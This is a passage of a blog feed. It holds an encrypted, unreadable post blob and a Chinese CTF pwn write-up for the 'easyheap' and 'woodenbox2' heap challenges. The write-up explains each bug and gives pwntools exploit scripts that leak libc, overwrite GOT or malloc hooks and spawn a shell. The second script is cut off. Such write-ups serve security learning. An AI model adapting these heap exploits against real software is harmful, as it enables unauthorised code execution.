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 </div>]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>高校战“疫”网络安全分享赛 pwn 复现</title>
    <link href="https://nocbtm.github.io/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-pwn-%E5%A4%8D%E7%8E%B0/"/>
    <id>https://nocbtm.github.io/2020/03/09/高校战“疫”网络安全分享赛-pwn-复现/</id>
    <published>2020-03-09T06:59:08.000Z</published>
    <updated>2020-03-10T07:09:53.648Z</updated>
    
    <content type="html"><![CDATA[<h2 id="easyheap"><a href="#easyheap" class="headerlink" title="easyheap"></a>easyheap</h2><p>程序没开PIE，got表可写</p><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>ptr[v1]清零了，但*(void **)ptr[v1]没有清零。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">int sub_4009E4()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [rsp+Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  if ( ++dword_6020AC &gt; 4 )</span><br><span class="line">    return puts(&quot;Delete failed.&quot;);</span><br><span class="line">  puts(&quot;What is the index of the item to be deleted?&quot;);</span><br><span class="line">  v1 = sub_400890();</span><br><span class="line">  if ( v1 &lt; 0 || v1 &gt; 6 || !ptr[v1] )</span><br><span class="line">    return puts(&quot;Delete failed.&quot;);</span><br><span class="line">  free(*(void **)ptr[v1]);</span><br><span class="line">  free(ptr[v1]);</span><br><span class="line">  ptr[v1] = 0LL;</span><br><span class="line">  return puts(&quot;Delete successfully.&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>首先申请俩次堆块都是0x10，然后free掉，看到add函数里是先进行malloc(0x10)，然后在做check，然后再申请check(0x400)，所以由于free之后会残留指针，在free掉俩个堆块之后，故意输入大数字让他check size fail直接返回，然后申请一个0x10的堆块就可以实现堆块重叠。通过edit前俩次的堆块来覆盖最后一次malloc的堆块的ptr指针来指向chunk_list的位置，然后伪造chunk结构指向got，并且show一下就可以知道libc了，然后修改free_got为system然后free一个内容为/bin/sh的堆块就可以开启shell。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;tmux&apos;, &apos;sp&apos;, &apos;-h&apos;, &apos;-l&apos;, &apos;110&apos;]</span><br><span class="line">if sys.argv[1]==&quot;l&quot;:</span><br><span class="line">io=process(&apos;./easyheap&apos;)</span><br><span class="line">lib=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">else:</span><br><span class="line">io=remote(&apos;121.36.209.145&apos;,9997)</span><br><span class="line">lib=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line">elf=ELF(&apos;./easyheap&apos;)</span><br><span class="line"></span><br><span class="line">def choice(idx):</span><br><span class="line">    io.sendlineafter(&apos;Your choice:\n&apos;, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(size, content):</span><br><span class="line">    choice(1)</span><br><span class="line">    io.sendafter(&apos;this message?\n&apos;, str(size))</span><br><span class="line">    if size&lt; 0x400:</span><br><span class="line">    io.sendafter(&apos;content of the message?\n&apos;, content)</span><br><span class="line"></span><br><span class="line">def dele(idx):</span><br><span class="line">choice(2)</span><br><span class="line">io.sendlineafter(&apos;deleted?\n&apos;,str(idx))</span><br><span class="line"></span><br><span class="line">def edit(idx, content):</span><br><span class="line">    choice(3)</span><br><span class="line">    io.sendlineafter(&apos;modified?\n&apos;,str(idx))</span><br><span class="line">    io.sendafter(&apos;message?\n&apos;, content)</span><br><span class="line"></span><br><span class="line"># ------------------------------------------------</span><br><span class="line">onegadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]</span><br><span class="line">chunk_list=0x6020C0</span><br><span class="line"># ------------------------------------------------</span><br><span class="line">add(0x18,0x18 * &quot;\x10&quot;) #0</span><br><span class="line">add(0x18,0x18 * &quot;\x11&quot;) #1</span><br><span class="line">dele(0)</span><br><span class="line">add(0x500,&apos;&apos;)</span><br><span class="line">dele(1)</span><br><span class="line">add(0x500,&apos;&apos;)</span><br><span class="line"></span><br><span class="line">add(0x18,0x18 * &apos;\x12&apos;) #2</span><br><span class="line">edit(1,p64(0) + p64(0x18) + p64(chunk_list))</span><br><span class="line">edit(2,p64(chunk_list + 8) + p64(chunk_list))</span><br><span class="line">edit(0,p64(chunk_list + 8) + p64(chunk_list) + p64(chunk_list + 0x18) + p64(elf.got[&apos;free&apos;]) + p64(elf.got[&apos;__libc_start_main&apos;]) + p64(chunk_list + 0x30) + p64(elf.got[&apos;free&apos;]) + p64(elf.got[&apos;free&apos;]))</span><br><span class="line"></span><br><span class="line">edit(2,p64(elf.plt[&apos;puts&apos;]))</span><br><span class="line">dele(4)</span><br><span class="line">__libc_start_main = u64(io.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&apos;\x00&apos;))</span><br><span class="line">libc = __libc_start_main - lib.symbols[b&apos;__libc_start_main&apos;]</span><br><span class="line">lib.address = libc</span><br><span class="line">system = lib.symbols[&apos;system&apos;]</span><br><span class="line">binsh = lib.search(&quot;/bin/sh\x00&quot;).next()</span><br><span class="line">__dele_hook = lib.symbols[&apos;__free_hook&apos;]</span><br><span class="line">__malloc_hook = lib.symbols[&apos;__malloc_hook&apos;]</span><br><span class="line">__realloc_hook = lib.symbols[&apos;__realloc_hook&apos;]</span><br><span class="line"></span><br><span class="line">edit(5,p64(system))</span><br><span class="line">edit(0,p64(chunk_list + 8) + p64(binsh))</span><br><span class="line">dele(0)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="woodenbox2"><a href="#woodenbox2" class="headerlink" title="woodenbox2"></a>woodenbox2</h2><p>got表可写，其余保护全开</p><h3 id="漏洞点-1"><a href="#漏洞点-1" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>change_item()函数里面没有对size做限制，堆溢出。</p><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>题目难点在于没有输出功能，需要打io_file泄露libc基址。然后fastbin attack 打malloc_hook,这里onegadget失效，用realloc 调整偏移即可。<br>iofile泄露原理可参考EX师傅博客<a href="http://blog.eonew.cn/archives/1190" target="_blank" rel="noopener">http://blog.eonew.cn/archives/1190</a></p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><p>成功率 16分之一<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;tmux&apos;, &apos;sp&apos;, &apos;-h&apos;, &apos;-l&apos;, &apos;110&apos;]</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">    try:</span><br><span class="line">        if sys.argv[1]==&quot;l&quot;:</span><br><span class="line">        io=process(&apos;./woodenbox2&apos;)</span><br><span class="line">        libc=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">        else:</span><br><span class="line">        io=remote(&apos;121.36.215.224&apos;,9998)</span><br><span class="line">        libc=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line">        elf=ELF(&apos;./woodenbox2&apos;)</span><br><span class="line"></span><br><span class="line">        def choice(idx):</span><br><span class="line">            io.sendlineafter(&apos;Your choice:&apos;, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        def add(size, content):</span><br><span class="line">            choice(1)</span><br><span class="line">            io.sendlineafter(&apos;:&apos;, str(size))</span><br><span class="line">            io.sendafter(&apos;:&apos;, content)</span><br><span class="line"></span><br><span class="line">        def free(idx):</span><br><span class="line">        choice(3)</span><br><span class="line">        io.sendlineafter(&apos;:&apos;,str(idx))</span><br><span class="line"></span><br><span class="line">        def edit(idx,size, content):</span><br><span class="line">            choice(2)</span><br><span class="line">            io.sendlineafter(&apos;:&apos;,str(idx))</span><br><span class="line">            io.sendlineafter(&apos;:&apos;,str(size))</span><br><span class="line">            io.sendafter(&apos;:&apos;, content)</span><br><span class="line"></span><br><span class="line">        # ------------------------------------------------</span><br><span class="line">        iofile_off = [0x25dd,0xf5eb] #_IO_2_1_stderr_+157</span><br><span class="line">        onegadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]</span><br><span class="line"></span><br><span class="line">        # ------------------------------------------------</span><br><span class="line"></span><br><span class="line">        add(0x20,&apos;aaaa&apos;)#0</span><br><span class="line">        add(0x40,&apos;aaaa&apos;)#1</span><br><span class="line">        add(0x60,&apos;aaaa&apos;)#2</span><br><span class="line">        add(0xa0,&apos;aaaa&apos;)#3</span><br><span class="line"></span><br><span class="line">        edit(0,0x40,&apos;a&apos;*0x20+p64(0)+p64(0xc1))</span><br><span class="line">        free(1) 